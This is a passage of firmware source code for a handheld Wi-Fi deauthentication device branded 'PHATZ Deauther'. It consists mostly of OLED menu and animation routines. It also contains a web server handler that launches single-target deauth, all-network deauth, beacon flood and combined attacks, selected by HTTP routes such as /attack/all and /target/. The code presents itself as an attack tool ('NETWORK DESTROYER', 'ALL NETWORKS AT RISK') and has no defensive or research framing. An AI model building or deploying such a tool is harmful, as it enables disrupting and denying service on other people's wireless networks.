  display.drawRect(x, y, width, height, WHITE);
  display.fillRect(x + 2, y + 2, (width - 4) * progress / 100, height - 4, WHITE);
}

void drawMenuItem(int y, const char *text, bool selected) {
  if (selected) {
    display.fillRect(4, y - 1, SCREEN_WIDTH - 8, 11, WHITE);
    display.setTextColor(BLACK);
  } else {
    display.setTextColor(WHITE);
  }
  display.setCursor(8, y);
  display.print(text);
}

void drawStatusBar(const char *status) {
  display.fillRect(0, 0, SCREEN_WIDTH, 10, WHITE);
  display.setTextColor(BLACK);
  display.setCursor(4, 1);
  display.print(status);
  display.setTextColor(WHITE);
}



void drawMainMenu(int selectedIndex) {
  display.clearDisplay();

  // Tech frame with ornate corners only - removed inner rectangle
  display.drawRect(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT, WHITE);

  // Corner designs
  display.fillTriangle(0, 0, 10, 0, 0, 10, WHITE);
  display.fillTriangle(SCREEN_WIDTH-1, 0, SCREEN_WIDTH-11, 0, SCREEN_WIDTH-1, 10, WHITE);
  display.fillTriangle(0, SCREEN_HEIGHT-1, 10, SCREEN_HEIGHT-1, 0, SCREEN_HEIGHT-11, WHITE);
  display.fillTriangle(SCREEN_WIDTH-1, SCREEN_HEIGHT-1, SCREEN_WIDTH-11, SCREEN_HEIGHT-1, SCREEN_WIDTH-1, SCREEN_HEIGHT-11, WHITE);

  // Glowing title bar
  display.fillRect(0, 0, SCREEN_WIDTH, 12, WHITE);
  display.setTextColor(BLACK);
  display.setTextSize(1);
  display.setCursor(28, 2);
  display.print("DEAUTH SYSTEM");

  // Menu items with enhanced visual style and icons - removed rectangles around unselected items
  const char *menuItems[] = { ">> ATTACK", ">> SCAN", ">> SELECT", ">> SERVER", ">> INFO" };
  for (int i = 0; i < 5; i++) {
    // Only draw highlight for selected item, no boxes for unselected items
    if (i == selectedIndex) {
      display.fillRect(10, 18 + (i * 9), SCREEN_WIDTH-20, 9, WHITE);
    }

    // Draw menu text with scrolling for long text
    int maxWidth = SCREEN_WIDTH - 45; // Leave space for icons
    scrollText(String(menuItems[i]), 15, 19 + (i * 9), maxWidth, i == selectedIndex);

    // Draw icons
    if (i == 0) { // Attack - lightning bolt
      if (i == selectedIndex) {
        display.drawLine(100, 19 + (i * 9), 107, 23 + (i * 9), BLACK);
        display.drawLine(107, 23 + (i * 9), 103, 25 + (i * 9), BLACK);
        display.drawLine(103, 25 + (i * 9), 110, 27 + (i * 9), BLACK);
      } else {
        display.drawLine(100, 19 + (i * 9), 107, 23 + (i * 9), WHITE);
        display.drawLine(107, 23 + (i * 9), 103, 25 + (i * 9), WHITE);
        display.drawLine(103, 25 + (i * 9), 110, 27 + (i * 9), WHITE);
      }
    } else if (i == 1) { // Scan - radar
      if (i == selectedIndex) {
        display.drawCircle(105, 24 + (i * 9), 3, BLACK);
        display.drawCircle(105, 24 + (i * 9), 1, BLACK);
        display.drawLine(105, 24 + (i * 9), 108, 21 + (i * 9), BLACK);
      } else {
        display.drawCircle(105, 24 + (i * 9), 3, WHITE);
        display.drawCircle(105, 24 + (i * 9), 1, WHITE);
        display.drawLine(105, 24 + (i * 9), 108, 21 + (i * 9), WHITE);
      }
    } else if (i == 2) { // Select - target
      if (i == selectedIndex) {
        display.drawCircle(105, 24 + (i * 9), 3, BLACK);
        display.drawLine(105, 21 +(i * 9), 105, 27 + (i * 9), BLACK);
        display.drawLine(102, 24 + (i * 9), 108, 24 + (i * 9), BLACK);
      } else {
        display.drawCircle(105, 24 + (i * 9), 3, WHITE);
        display.drawLine(105, 21 + (i * 9), 105, 27 + (i * 9), WHITE);
        display.drawLine(102, 24 + (i * 9), 108, 24 + (i * 9), WHITE);
      }
    } else if (i == 3) { // Server - computer icon
      if (i == selectedIndex) {
        display.drawRect(102, 21 + (i * 9), 7, 5, BLACK);
        display.drawLine(105, 26 + (i * 9), 105, 27 + (i * 9), BLACK);
        display.drawLine(103, 27 + (i * 9), 107, 27 + (i * 9), BLACK);
      } else {
        display.drawRect(102, 21 + (i * 9), 7, 5, WHITE);
        display.drawLine(105, 26 + (i * 9), 105, 27 + (i * 9), WHITE);
        display.drawLine(103, 27 + (i * 9), 107, 27 + (i * 9), WHITE);
      }
    } else if (i == 4) { // Info - info icon
      if (i == selectedIndex) {
        display.drawCircle(105, 24 + (i * 9), 3, BLACK);
        display.drawLine(105, 21 + (i * 9), 105, 22 + (i * 9), BLACK);
        display.drawLine(105, 23 + (i * 9), 105, 26 + (i * 9), BLACK);
      } else {
        display.drawCircle(105, 24 + (i * 9), 3, WHITE);
        display.drawLine(105, 21 + (i * 9), 105, 22 + (i * 9), WHITE);
        display.drawLine(105, 23 + (i * 9), 105, 26 + (i * 9), WHITE);
      }
    }
  }

  display.display();
}

void drawScanScreen() {
  display.clearDisplay();

  // Matrix-like falling characters in the background
  static const char matrixChars[] = { '0', '1', 'X', '#', '*', '>', '<', '=' };
  static int charPositions[16] = {0}; // Positions for falling chars

  // Loop with enhanced hacker animations
  for (int i = 0; i < 20; i++) {
    display.clearDisplay();

    // Draw animated matrix-like background
    for (int j = 0; j < 16; j++) {
      int x = 8 * j;
      charPositions[j] = (charPositions[j] + random(0, 3)) % 64;
      display.setTextColor(WHITE);
      display.setTextSize(1);
      display.setCursor(x, charPositions[j]);
      display.print(matrixChars[random(0, sizeof(matrixChars))]);
    }

    // Draw targeting frame
    display.drawRect(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT, WHITE);
    display.drawRect(2, 2, SCREEN_WIDTH-4, SCREEN_HEIGHT-4, WHITE);

    // Draw corner accents
    display.drawLine(0, 0, 10, 0, WHITE);
    display.drawLine(0, 0, 0, 10, WHITE);
    display.drawLine(SCREEN_WIDTH-11, 0, SCREEN_WIDTH-1, 0, WHITE);
    display.drawLine(SCREEN_WIDTH-1, 0, SCREEN_WIDTH-1, 10, WHITE);

    // Title with glitch effect
    display.fillRect(15, 0, 98, 12, i % 2 == 0 ? WHITE : BLACK);
    display.setTextColor(i % 2 == 0 ? BLACK : WHITE);
    display.setCursor(38, 2);
    display.print("SCANNING");

    // Progress indicators
    String progressChars = "";
    for (int p = 0; p < 10; p++) {
      if (p < i/2) progressChars += ">";
      else progressChars += ".";
    }
    display.setTextColor(WHITE);
    display.setCursor(35, 30);
    display.print(progressChars);

    // Progress percentage
    display.setCursor(40, 45);
    display.print(i * 5);
    display.print("%");

    display.display();
    delay(250);
  }

  // Final screen flash for completion effect
  for (int f = 0; f < 3; f++) {
    display.invertDisplay(true);
    delay(100);
    display.invertDisplay(false);
    delay(100);
  }
}

// Helper function to scroll text if it's too long
void scrollText(String text, int x, int y, int maxWidth, bool isSelected) {
  static unsigned long scrollTimer = 0;
  static int scrollOffset = 0;
  static String lastText = "";

  // Reset scroll position when text changes
  if (lastText != text) {
    scrollOffset = 0;
    lastText = text;
  }

  // Calculate text width
  int textWidth = text.length() * 6; // Approximate width for standard font

  // Set appropriate text color
  display.setTextColor(isSelected ? BLACK : WHITE);

  // Handle scrolling for long text
  if (textWidth > maxWidth) {
    // Update scroll position every 500ms
    if (millis() - scrollTimer > 500) {
      scrollTimer = millis();
      scrollOffset += 1;
      // Reset scroll when we've shown the entire text
      if (scrollOffset > textWidth - maxWidth + 12) {
        scrollOffset = 0;
      }
    }

    // Create a clipping rectangle and scroll the text
    display.setCursor(x - scrollOffset, y);
    display.print(text + "   " + text.substring(0, 10)); // Add padding and repeat start

    // Draw fade effect on edges if scrolling
    if (scrollOffset > 0) {
      // Left fade
      display.setTextColor(isSelected ? WHITE : BLACK);
      for (int i = 0; i < 3; i++) {
        display.drawLine(x + i, y - 1, x + i, y + 8, isSelected ? BLACK : WHITE);
      }
      // Right fade
      for (int i = 0; i < 3; i++) {
        display.drawLine(x + maxWidth - i, y - 1, x + maxWidth - i, y + 8, isSelected ? BLACK : WHITE);
      }
    }
  } else {
    // Just display the text normally for short strings
    display.setCursor(x, y);
    display.print(text);
  }
}

void drawNetworkList(const String &selectedSSID, const String &channelType, int scrollIndex) {
  display.clearDisplay();

  // Draw frame with tech aesthetic
  display.drawRect(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT, WHITE);

  // Draw corner accents
  display.drawLine(0, 0, 10, 0, WHITE);
  display.drawLine(0, 0, 0, 10, WHITE);
  display.drawLine(SCREEN_WIDTH-11, 0, SCREEN_WIDTH-1, 0, WHITE);
  display.drawLine(SCREEN_WIDTH-1, 0, SCREEN_WIDTH-1, 10, WHITE);

  // Header
  display.fillRect(0, 0, SCREEN_WIDTH, 10, WHITE);
  display.setTextColor(BLACK);
  display.setCursor(4, 1);
  display.print("NET");
  display.print("[");
  display.print(scrollIndex + 1);
  display.print("/");
  display.print(scan_results.size());
  display.print("]");

  // Network info box
  display.setTextColor(WHITE);
  display.drawRect(5, 15, SCREEN_WIDTH-10, 40, WHITE);

  // SSID display with scrolling for long names
  display.setTextColor(WHITE);
  int maxWidth = SCREEN_WIDTH - 20;
  scrollText(selectedSSID, 9, 20, maxWidth, false);

  // Channel info
  display.drawLine(5, 30, SCREEN_WIDTH-5, 30, WHITE);
  display.setCursor(9, 35);
  display.print("CH:");
  display.print(scan_results[scrollIndex].channel);
  display.print(" | ");
  display.print(channelType);

  // RSSI display
  display.setCursor(9, 45);
  display.print("RSSI:");
  display.print(scan_results[scrollIndex].rssi);
  display.print("dBm");

  // Scroll indicators
  if (scrollIndex > 0) {
    display.fillTriangle(64, 58, 60, 62, 68, 62, WHITE);
  }
  if (static_cast<size_t>(scrollIndex) < scan_results.size() - 1) {
    display.fillTriangle(84, 62, 80, 58, 88, 58, WHITE);
  }

  display.display();
}

void drawAttackScreen(int attackType) {
  // Dramatic startup animation
  for (int i = 0; i < 5; i++) {
    display.clearDisplay();

    // Alternating flash effect
    if (i % 2 == 0) {
      display.fillScreen(WHITE);
      display.display();
      delay(50);
      continue;
    }

    // Attack warning signs
    display.drawRect(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT, WHITE);

    // Hazard stripes that expand
    for (int j = 0; j < 4; j++) {
      int offset = (i * 3) % 20;
      display.fillRect(offset + j*20, 0, 10, 10, WHITE);
      display.fillRect(offset + j*20, SCREEN_HEIGHT-10, 10, 10, WHITE);
    }

    display.setTextColor(WHITE);
    display.setTextSize(1);
    display.setCursor(12, 20);
    display.print("INITIALIZING ATTACK");

    // Countdown animation
    display.setTextSize(2);
    display.setCursor(50, 35);
    display.print("T-");
    display.print(5-i);

    display.display();
    delay(200);
  }

  // Final attack launch screen
  display.clearDisplay();

  // Explosive pattern
  for (int r = 0; r < 4; r++) {
    display.clearDisplay();

    // Expanding circle effect
    for (int rad = 0; rad < 30; rad += 10) {
      display.drawCircle(SCREEN_WIDTH/2, SCREEN_HEIGHT/2, rad + r*8, WHITE);
    }

    // Attack type indicator with dramatic presentation
    display.setTextColor(WHITE);
    display.setTextSize(1);

    // Attack type names
    const char *attackTypes[] = {
      "SINGLE DEAUTH",
      "ALL DEAUTH",
      "BEACON FLOOD",
      "COMBO ATTACK",
      "BEAST MODE"
    };

    if (attackType >= 0 && attackType < 5) {
      // Center the text
      int textWidth = strlen(attackTypes[attackType]) * 6;
      display.setCursor((SCREEN_WIDTH - textWidth) / 2, SCREEN_HEIGHT/2 - 4);
      display.print(attackTypes[attackType]);
    }

    display.display();
    delay(150);
  }

  // Main attack screen
  display.clearDisplay();
  drawFrame();

  // Warning banner with hazard stripes
  display.fillRect(0, 0, SCREEN_WIDTH, 10, WHITE);
  for (int s = 0; s < SCREEN_WIDTH; s += 16) {
    display.fillRect(s, 0, 8, 10, BLACK);
  }

  display.setTextColor(WHITE);
  display.setCursor(15, 1);
  display.print("ATTACK LAUNCHED");

  display.setTextColor(WHITE);
  display.setCursor(10, 20);

  // Attack type indicator with icon
  const char *attackTypes[] = {
    "SINGLE DEAUTH",
    "ALL DEAUTH",
    "BEACON FLOOD",
    "COMBO ATTACK",
    "BEAST MODE"
  };

  if (attackType >= 0 && attackType < 5) {
    display.print(attackTypes[attackType]);

    // Draw attack-specific icon
    if (attackType == 0) { // Single target
      display.drawCircle(100, 20, 6, WHITE);
      display.drawLine(97, 17, 103, 23, WHITE);
      display.drawLine(103, 17, 97, 23, WHITE);
    } else if (attackType == 1) { // Mass deauth
      for (int d = 0; d < 3; d++) {
        display.drawCircle(95+d*5, 20, 3, WHITE);
        display.drawLine(95+d*5-2, 20-2, 95+d*5+2, 20+2, WHITE);
      }
    } else if (attackType == 2) { // Beacon
      display.drawTriangle(100, 14, 95, 24, 105, 24, WHITE);
      display.drawLine(100, 14, 100, 10, WHITE);
    } else if (attackType == 3) { // Combo
      display.drawCircle(100, 20, 6, WHITE);
      display.drawLine(95, 20, 105, 20, WHITE);
      display.drawLine(100, 15, 100, 25, WHITE);
    } else if (attackType == 4) { // Beast Mode
      // Draw skull and crossbones
      display.drawRect(95, 15, 10, 10, WHITE); // Skull
      display.drawPixel(98, 18, WHITE); // Left eye
      display.drawPixel(102, 18, WHITE); // Right eye
      display.drawLine(96, 22, 104, 22, WHITE); // Mouth
      // Crossbones
      display.drawLine(93, 27, 107, 33, WHITE);
      display.drawLine(93, 33, 107, 27, WHITE);
    }
  }

  // Progress bar animation
  display.drawRect(10, 34, SCREEN_WIDTH - 20, 8, WHITE);

  // Animated loading sequence - special for Beast Mode
  if (attackType == 4) {
    // More aggressive loading animation for Beast Mode
    for (int i = 0; i < 8; i++) {
      display.fillRect(12, 36, SCREEN_WIDTH-24, 4, BLACK);

      // Fill progress bar with pulsing effect
      for (int p = 0; p < SCREEN_WIDTH-24; p += 8) {
        int width = min(4 + i, 8);
        if (p < ((i+1) * (SCREEN_WIDTH-24))/8) {
          display.fillRect(12 + p, 36, width, 4, WHITE);
        }
      }

      // Draw text with more aggressive language
      display.fillRect(0, 47, SCREEN_WIDTH, 10, BLACK);
      display.setCursor(i < 4 ? 15 : 20, 48);
      display.print(i < 4 ? "CHARGING WEAPON" : "MAXIMUM POWER");
      for (int j = 0; j < (i % 4) + 1; j++) {
        display.print("!");
      }

      display.display();
      delay(100);
    }
  } else {
    // Regular loading animation for other attacks
    static const char patterns[] = { '.', 'o', 'O', '*', 'X', '*', 'O', 'o' };
    for (size_t i = 0; i < sizeof(patterns); i++) {
      // Fill progress bar
      int fillWidth = ((i+1) * (SCREEN_WIDTH - 24)) / sizeof(patterns);
      display.fillRect(12, 36, fillWidth, 4, WHITE);

      // Draw text
      display.setCursor(20, 48);
      display.print("PREPARING");
      for (size_t j = 0; j <= i; j++) {
        display.print(patterns[j % 4]);
      }

      display.display();
      delay(150);
    }
  }

  // Final "READY" indicator
  display.fillRect(0, 47, SCREEN_WIDTH, 10, BLACK);
  display.setCursor(35, 48);
  display.print(attackType == 4 ? "UNLEASH!" : "READY!");
  display.display();
  delay(500);
}
void titleScreen(void) {
  // Initial evil wake-up sequence
  for (int i = 0; i < 3; i++) {
    display.clearDisplay();
    display.fillScreen(WHITE);
    display.display();
    delay(50);
    display.clearDisplay();
    display.display();
    delay(100);
  }

  // Evil eye opening animation
  for (int i = 0; i < 8; i++) {
    display.clearDisplay();
    // Draw evil eye
    display.fillCircle(64, 32, 20 - i, WHITE);
    display.fillCircle(64, 32, 18 - i, BLACK);
    display.fillCircle(64, 32, 8, WHITE);
    display.fillCircle(64, 32, 3, BLACK);
    display.display();
    delay(80);
  }

  // Evil title glitch effect
  for (int f = 0; f < 12; f++) {
    display.clearDisplay();
    // Draw pentagram in background
    display.drawLine(64, 10, 80, 40, WHITE);
    display.drawLine(80, 40, 48, 25, WHITE);
    display.drawLine(48, 25, 80, 25, WHITE);
    display.drawLine(80, 25, 48, 40, WHITE);
    display.drawLine(48, 40, 64, 10, WHITE);

    // Draw glitchy skull
    display.drawRect(50, 15, 28, 25, WHITE); // Skull outline
    display.fillRect(56, 24, 4, 5, f % 2 == 0 ? WHITE : BLACK); // Left eye
    display.fillRect(68, 24, 4, 5, f % 3 == 0 ? WHITE : BLACK); // Right eye
    display.drawLine(60, 35, 66, 35, WHITE); // Mouth

    // Title with glitch effect
    display.setTextSize(1);
    display.setTextColor(WHITE);

    if (f % 3 != 0) {
      display.setCursor(f % 4 == 0 ? 13 : 12, 5);
      display.print("PHATZ NETWORK KILLER");
    }

    display.setCursor(f % 2 == 0 ? 26 : 25, 48);
    display.print(f % 5 == 0 ? "5GHZ DEAUTHER" : "5 G H Z DEAUTHER");

    // Scattered broken wifi symbols
    for (int w = 0; w < 6; w++) {
      int x = (f * 7 + w * 20) % SCREEN_WIDTH;
      int y = (f * 3 + w * 10) % 20 + 55;
      display.drawBitmap(x, y, image_wifi_not_connected__copy__bits, 19, 16, f % 2 == 0 ? WHITE : BLACK);
    }

    // Draw corrupted frame
    for (int l = 0; l < 128; l += 8) {
      if ((l + f) % 5 != 0) {
        display.drawLine(l, 0, l, 5, WHITE);
        display.drawLine(l, 63, l, 58, WHITE);
      }
    }

    // Draw glitch lines
    if (f % 4 == 0) {
      display.fillRect(0, (f * 7) % 64, SCREEN_WIDTH, 2, WHITE);
    }

    display.display();
    delay(f % 2 == 0 ? 120 : 80);
  }

  // Final screen with warning
  display.clearDisplay();
  display.drawRect(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT, WHITE);
  display.drawRect(2, 2, SCREEN_WIDTH - 4, SCREEN_HEIGHT - 4, WHITE);

  // Hazard corners
  display.drawLine(0, 0, 10, 10, WHITE);
  display.drawLine(SCREEN_WIDTH-1, 0, SCREEN_WIDTH-11, 10, WHITE);
  display.drawLine(0, SCREEN_HEIGHT-1, 10, SCREEN_HEIGHT-11, WHITE);
  display.drawLine(SCREEN_WIDTH-1, SCREEN_HEIGHT-1, SCREEN_WIDTH-11, SCREEN_HEIGHT-11, WHITE);

  display.setTextSize(1);
  display.setTextColor(WHITE);

  // Title with malicious feel
  display.setCursor(15, 8);
  display.print("NETWORK DESTROYER");

  display.setCursor(32, 25);
  display.print("PHATZ DEAUTHER");

  // Warning text
  display.setCursor(10, 38);
  display.print("* SYSTEM ACTIVATED *");

  display.setCursor(10, 50);
  display.print("ALL NETWORKS AT RISK");

  display.display();
  delay(2000);
}

// WebServer mode for remote control
void stopWebServer() {
  server.stop();
  clearStopRequest();
}

void resetWebServer() {
  // Stop and restart the server
  server.stop();
  delay(100);  // Short delay to ensure socket cleanup

  // Attempt to restart server
  for (int i = 0; i < 3; i++) {
    server.begin();  // Try to start server (returns void, not bool)
    delay(500);      // Wait a bit for the server to initialize
  }

  // Visual feedback for reset
  display.fillRect(0, 0, SCREEN_WIDTH, 10, WHITE);
  display.setTextColor(BLACK);
  display.setCursor(10, 1);
  display.print("SERVER RESET");
  display.display();
  delay(500);
}

// Reset WiFi function for RTL8720DN
void resetWiFi() {
  // Show reset status
  display.clearDisplay();
  display.setTextColor(WHITE);
  display.setTextSize(1);
  display.setCursor(5, 10);
  display.println("Resetting WiFi...");
  display.display();

  // Disconnect current WiFi connection
  WiFi.disconnect();
  delay(500);

  // Stop any running server
  if (server.available()) {
    server.stop();
    delay(200);
  }

  // Reset the WiFi hardware
  wext_set_channel(WLAN0_NAME, 1); // Set to default channel

  // Attempt to re-establish WiFi connection
  for (int attempt = 0; attempt < 3; attempt++) {
    display.setCursor(5, 30);
    display.print("Attempt ");
    display.print(attempt + 1);
    display.print("/3");
    display.display();

    // Try to start WiFi in AP mode again
    WiFi.apbegin(ssid, pass, (char *)String(current_channel).c_str());
    delay(1000);

    // Check if connection successful
    if (WiFi.status() == WL_CONNECTED) {
      break;
    }

    // Wait before next attempt
    delay(1000);
  }

  // Start fresh scan of networks
  display.setCursor(5, 40);
  display.print("Scanning networks...");
  display.display();
  scanNetworks();

  // Visual feedback for completion
  display.clearDisplay();
  display.setTextColor(WHITE);
  display.setTextSize(1);
  display.setCursor(5, 20);
  display.println("WiFi Reset Complete");
  display.setCursor(5, 35);
  display.print("Found ");
  display.print(scan_results.size());
  display.print(" networks");
  display.display();
  delay(1500);
}

// Combined function to reset both WiFi and web server
void resetDevice() {
  // Visual feedback
  display.clearDisplay();
  display.setTextColor(WHITE);
  display.setTextSize(1);
  display.setCursor(5, 20);
  display.println("FULL DEVICE RESET");
  display.setCursor(5, 35);
  display.println("Please wait...");
  display.display();
  delay(1000);

  // First reset WiFi
  resetWiFi();

  // Then reset web server
  resetWebServer();

  // Confirmation
  display.clearDisplay();
  display.setTextColor(WHITE);
  display.setTextSize(1);
  display.setCursor(15, 25);
  display.println("Device fully reset");
  display.setCursor(15, 35);
  display.println("System ready");
  display.display();
  delay(1000);
}

void WebServerMode() {
  clearStopRequest(); // Clear any previous stop requests
  bool serverRunning = true;
  display.clearDisplay();

  // Start with server initialization animation
  for (int i = 0; i < 4; i++) {
    // Check for early exit button
    if (digitalRead(BTN_OK) == LOW) {
      return; // Exit early if requested
    }

    display.clearDisplay();
    display.setTextColor(WHITE);
    display.setTextSize(1);

    // Animated server startup
    display.drawRect(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT, WHITE);
    display.drawRect(3, 3, SCREEN_WIDTH-6, SCREEN_HEIGHT-6, WHITE);

    // Title
    display.fillRect(0, 0, SCREEN_WIDTH, 12, WHITE);
    display.setTextColor(BLACK);
    display.setCursor(12, 2);
    display.print("WEB SERVER STARTUP");

    // Progress animation
    display.setTextColor(WHITE);
    display.setCursor(25, 20);
    display.print("INITIALIZING");

    // Loading dots
    for (int j = 0; j <= i; j++) {
      display.print(".");
    }

    // Server icon that grows
    int serverSize = 10 + i*3;
    display.drawRect(SCREEN_WIDTH/2 - serverSize/2, 32, serverSize, serverSize + 5, WHITE);

    // Network lines
    for (int l = 0; l < i+1; l++) {
      display.drawLine(
        SCREEN_WIDTH/2, 32 + serverSize + 5,
        SCREEN_WIDTH/2 - 20 + l*14, 32 + serverSize + 15,
        WHITE
      );
    }

    display.display();
    delay(500);
  }

  // Start server
  server.begin();
  IPAddress ip = WiFi.localIP();

  // Final screen with IP address
  display.clearDisplay();
  display.drawRect(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT, WHITE);

  // Title
  display.fillRect(0, 0, SCREEN_WIDTH, 12, WHITE);
  display.setTextColor(BLACK);
  display.setCursor(15, 2);
  display.print("WEB SERVER ACTIVE");

  // IP and connection info
  display.setTextColor(WHITE);
  display.setCursor(5, 16);
  display.print("Server IP:");

  display.setCursor(5, 28);
  display.print(ip[0]);
  display.print(".");
  display.print(ip[1]);
  display.print(".");
  display.print(ip[2]);
  display.print(".");
  display.print(ip[3]);

  display.setCursor(5, 40);
  display.print("Connect to WiFi: ");

  display.setCursor(5, 50);
  display.print(ssid);

  display.display();

  // Server main loop
  unsigned long lastUpdateTime = 0;
  unsigned long lastActivityBlink = 0;
  unsigned long lastServerCheck = 0;
  bool activityLed = false;

  // Start server and confirm it's running
  if (!server.available()) {
    server.begin();
    delay(100);
  }

  while (serverRunning && !stopAttackRequested) {
    // Check for exit button with improved debounce
    if (digitalRead(BTN_OK) == LOW) {
      delay(100);
      // Visual feedback
      display.fillRect(5, 5, SCREEN_WIDTH-10, 10, WHITE);
      display.setTextColor(BLACK);
      display.setCursor(15, 7);
      display.print("SHUTTING DOWN SERVER");
      display.display();

      // Stop the server
      server.stop();
      requestStopAttack();
      serverRunning = false;

      // Confirmation
      display.clearDisplay();
      display.setTextColor(WHITE);
      display.setCursor(15, 20);
      display.print("Web Server Stopped");
      display.setCursor(15, 35);
      display.print("Returning to menu...");
      display.display();
      delay(1000);
      break;
    }

    // Activity indicator blink
    if (millis() - lastActivityBlink > 500) {
      activityLed = !activityLed;
      lastActivityBlink = millis();
      display.fillRect(120, 2, 5, 5, activityLed ? WHITE : BLACK);
      display.fillRect(0, 0, 3, 3, activityLed ? WHITE : BLACK);
      display.fillRect(SCREEN_WIDTH-3, 0, 3, 3, activityLed ? WHITE : BLACK);
      display.display();
    }

    // Check server health periodically
    if (millis() - lastServerCheck > 5000) { // Check every 5 seconds
      lastServerCheck = millis();
      if (!server.available()) {
        // Server appears crashed - attempt to reset
        display.fillRect(0, 0, SCREEN_WIDTH, 10, WHITE);
        display.setTextColor(BLACK);
        display.setCursor(5, 1);
        display.print("SERVER CRASHED - RESETTING");
        display.display();

        resetWebServer();
      }
    }

    // Handle client connections
    WiFiClient client = server.available();

    if (client) {
      // Visual feedback for connection
      display.fillRect(120, 2, 5, 5, WHITE);
      display.display();

      String currentLine = "";
      String request = "";

      while (client.connected()) {
        if (client.available()) {
          char c = client.read();
          request += c;

          if (c == '\n') {
            if (currentLine.length() == 0) {
              // End of client HTTP request, send response

              // Check if the request contains attack commands
              bool commandProcessed = false;
              String attackType = "";
              int targetIndex = scrollindex;
              int powerLevel = perdeauth;

              if (request.indexOf("GET /attack/single") >= 0) {
                attackType = "SINGLE";
                commandProcessed = true;
              } else if (request.indexOf("GET /attack/all") >= 0) {
                attackType = "ALL";
                commandProcessed = true;
              } else if (request.indexOf("GET /attack/beacon") >= 0) {
                attackType = "BEACON";
                commandProcessed = true;
              } else if (request.indexOf("GET /attack/combo") >= 0) {
                attackType = "COMBO";
                commandProcessed = true;
              } else if (request.indexOf("GET /attack/beast") >= 0) {
                attackType = "BEAST";
                commandProcessed = true;
              } else if (request.indexOf("GET /scan") >= 0) {
                // Execute scan command
                scanNetworks();
                commandProcessed = true;
              } else if (request.indexOf("GET /target/") >= 0) {
                // Extract target index
                int startPos = request.indexOf("GET /target/") + 12;
                int endPos = request.indexOf(" ", startPos);
                if (endPos > startPos) {
                  targetIndex = request.substring(startPos, endPos).toInt();
                  if (targetIndex >= 0 && (size_t)targetIndex < scan_results.size()) {
                    scrollindex = targetIndex;
                    SelectedSSID = scan_results[scrollindex].ssid;
                    SSIDCh = scan_results[scrollindex].channel >= 36 ? "5G" : "2.4G";
                    commandProcessed = true;
                  }
                }
              } else if (request.indexOf("GET /power/") >= 0) {
                // Extract power level
                int startPos = request.indexOf("GET /power/") + 11;
                int endPos = request.indexOf(" ", startPos);
                if (endPos > startPos) {
                  powerLevel = request.substring(startPos, endPos).toInt();
                  if (powerLevel >= 1 && powerLevel <= 10) {
                    perdeauth = powerLevel;
                    commandProcessed = true;
                  }
                }
              } else if (request.indexOf("GET /stop") >= 0) {
                // Stop any running attack
                requestStopAttack();
                commandProcessed = true;
                // Show stop command feedback
                display.clearDisplay();
                display.setTextColor(WHITE);
                display.setTextSize(1);
                display.setCursor(15, 20);
                display.print("ATTACK STOPPED");
                display.setCursor(10, 35);
                display.print("All operations halted");
                display.display();
                delay(1000);
              }

              // Send HTTP header
              client.println("HTTP/1.1 200 OK");
              client.println("Content-type:text/html");
              client.println("Connection: close");
              client.println();

              // Send HTML page with terminal-style design
              client.println("<!DOCTYPE html>");
              client.println("<html lang='en'>");
              client.println("<head>");
              client.println("<meta charset='UTF-8'>");
              client.println("<meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no'>");
              client.println("<meta name='theme-color' content='#000000'>");
              client.println("<title>PHATZ Deauther Control</title>");
              client.println("<style>");
              client.println("* { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }");
              client.println("body { font-family: 'Courier New', monospace; background-color: #000000; color: #00ff00; line-height: 1.4; padding: 8px; overflow-x: hidden; touch-action: manipulation; }");

              // Vibrant green hacker-style variables
              client.println(":root { --neon-green: #00ff00; --bright-green: #5fff5f; --dark-green: #003300; --bg-dark: #000000; --danger: #ff2222; --box-shadow: 0 0 5px var(--neon-green); }");

              // Responsive grid layout for all devices
              client.println("@media (min-width: 768px) {");
              client.println("  .grid-container { display: grid; grid-template-columns: repeat(12, 1fr); grid-template-rows: auto; gap: 10px; width: 100%; max-width: 1200px; margin: 0 auto; }");
              client.println("  .network-panel { grid-column: 1 / 5; grid-row: 2 / 5; }");
              client.println("  .attack-panel { grid-column: 5 / 9; grid-row: 2 / 3; }");
              client.println("  .stats-panel { grid-column: 9 / 13; grid-row: 2 / 3; }");
              client.println("  .target-panel { grid-column: 5 / 13; grid-row: 3 / 4; }");
              client.println("  .console-panel { grid-column: 1 / 13; grid-row: 5 / 6; height: 180px; }");
              client.println("}");

              client.println("@media (max-width: 767px) {");
              client.println("  .grid-container { display: flex; flex-direction: column; gap: 10px; width: 100%; margin: 0 auto; }");
              client.println("  .panel-header { position: sticky; top: 0; background-color: black; z-index: 2; }");
              client.println("  .network-panel, .attack-panel, .stats-panel, .target-panel, .console-panel { margin-bottom: 10px; }");
              client.println("  .attack-options { grid-template-columns: repeat(3, 1fr); }");
              client.println("  .console-panel { height: 150px; }");
              client.println("}");

              // Box styles with glowing borders
              client.println(".box { border: 1px solid var(--neon-green); box-shadow: var(--box-shadow); padding: 8px; position: relative; overflow: hidden; }");
              client.println(".box::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: linear-gradient(90deg, transparent, var(--neon-green), transparent); }");

              // Title panel
              client.println(".title-panel { grid-column: 1 / 13; grid-row: 1; text-align: center; text-transform: uppercase; letter-spacing: 3px; font-weight: bold; padding: 6px; font-size: 16px; border: 1px solid var(--neon-green); box-shadow: var(--box-shadow); margin-bottom: 8px; }");

              // Main layout containers - base styles
              client.println(".network-panel, .attack-panel, .stats-panel, .target-panel, .console-panel { border: 1px solid var(--neon-green); box-shadow: var(--box-shadow); }");

              // Panel headers
              client.println(".panel-header { border-bottom: 1px solid var(--neon-green); margin-bottom: 8px; padding: 5px; font-weight: bold; text-transform: uppercase; font-size: 14px; letter-spacing: 1px; }");

              // Network list styling - enhanced for touch devices
              client.println(".network-list { height: calc(100% - 70px); overflow-y: auto; -webkit-overflow-scrolling: touch; margin-top: 8px; overscroll-behavior: contain; }");
              client.println(".network-item { padding: 10px; border: 1px solid var(--neon-green); margin-bottom: 8px; position: relative; }");
              client.println(".network-item:hover, .network-item:active { background-color: rgba(0,255,0,0.1); }");
